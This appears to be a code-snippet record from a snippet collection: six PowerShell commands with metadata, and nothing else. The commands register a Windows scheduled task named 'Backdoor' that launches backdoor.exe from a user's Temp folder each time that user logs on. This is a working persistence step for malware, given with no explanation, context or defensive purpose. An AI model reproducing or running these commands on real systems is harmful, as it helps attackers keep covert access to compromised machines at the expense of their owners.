---
id: 9c69ace2-14cc-4886-91c5-dcc4cc7006d6
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:27.837357+00:00'
updated_at: '2023-04-10T20:37:30.433027+00:00'
---

# Code Snippet 9c69ace2

**Language**: Powershell

```powershell
PS C:\> $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Users\Rasta\AppData\Local\Temp\backdoor.exe"
PS C:\> $T = New-ScheduledTaskTrigger -AtLogOn -User "Rasta"
PS C:\> $P = New-ScheduledTaskPrincipal "Rasta"
PS C:\> $S = New-ScheduledTaskSettingsSet
PS C:\> $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
PS C:\> Register-ScheduledTask Backdoor -InputObject $D
```
